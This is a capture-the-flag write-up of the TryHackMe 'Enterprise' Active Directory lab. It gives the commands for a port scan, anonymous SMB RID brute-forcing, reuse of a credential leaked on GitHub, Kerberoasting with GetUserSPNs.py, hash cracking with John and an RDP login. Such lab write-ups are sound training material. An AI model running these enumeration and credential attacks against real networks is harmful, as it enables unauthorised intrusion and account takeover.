---
description: https://tryhackme.com/room/enterprise
---

# Enterprise

## Nmap

```python
sudo nmap 10.10.103.17 -p- -sS -sV -PA

PORT      STATE    SERVICE       VERSION
53/tcp    filtered domain
80/tcp    open     http          Microsoft IIS httpd 10.0
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-24 07:41:39Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
5357/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7990/tcp  open     http          Microsoft IIS httpd 10.0
9389/tcp  open     mc-nmf        .NET Message Framing
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open     msrpc         Microsoft Windows RPC
49672/tcp open     msrpc         Microsoft Windows RPC
49674/tcp open     msrpc         Microsoft Windows RPC
49702/tcp open     msrpc         Microsoft Windows RPC
49707/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Initial enumeration on SMB with `crackmapexec` using anonymous credentials shows the following discovered users through  rid bruteforcing.

```python
crackmapexec smb 10.10.103.17  -u 'a' -p '' --users --rid-brute | grep '(SidTypeUser)' 
```

![](<.gitbook/assets/Enterpirse - SMB users.png>)

From above we now have the following known user accounts.

```
atlbitbucket
bitbucket
nik
spooks
korone
banana
cake
contractor-temp
varg
joiner
```

As well as non default groups

```python
crackmapexec smb 10.10.103.17  -u 'a' -p '' --users --rid-brute | grep '(SidTypeGroup)' 
```

![](<.gitbook/assets/Enterprise - SMB Groups.png>)

```
Password-Policy-Exemption
Contractor
sensitive-account
adobe-subscription
```

Checking listed shares with an anonymous login&#x20;

```python
smbclient -U 'a' -L \\\\10.10.103.17\\
```

![](<.gitbook/assets/SMB anonymous login Shares.png>)

From the Nmap scan earlier we see that port 7990 is hosting a HTTP service. Upon inspection:

![](<.gitbook/assets/Enterprise - ATLASSIAN Page (1).png>)

As per the image above we are hinted towards searching for Enterprise-THM on GitHub. as shown in the findings below: [https://github.com/Enterprise-THM](https://github.com/Enterprise-THM).

We also notice that the user 'Nik-enterprise-dev' is a member of this and is likely the same user as we found earlier from initial enumeration.

![](<.gitbook/assets/Enterprise - Enterprise-THM GitHub.png>)

Further inspection of the users repositories we find a `PowerShell` script called SystemInfo.ps1. Look at the initial commit we see the user has accidentally left credentials inside the script.

![](<.gitbook/assets/Enterprise - Nik GitHub.png>)

Checking the new found credentials against the user nik with `crackmapexec` proves successful.

```python
crackmapexec smb 10.10.103.17  -u 'nik' -p 'ToastyBoi!'
```

Further enumeration shows that now with valid credentials we are able to pull a SPN for the bitbucket service account.

```python
sudo python GetUserSPNs.py lab.enterprise.thm/nik:'<Password>' -dc-ip 10.10.103.17 -request
```

![](<.gitbook/assets/Enterprise - SPNs.png>)

Running this against John we soon crack the password with the rockyou.txt wordlist.

![](<.gitbook/assets/Enterprise - John.png>)

We are then able to login to `RDP` as the user bitbucket with the discovered password.

```python
freerdp /u:bitbucket /p:'<Password>' /v:10.10.104.73
```
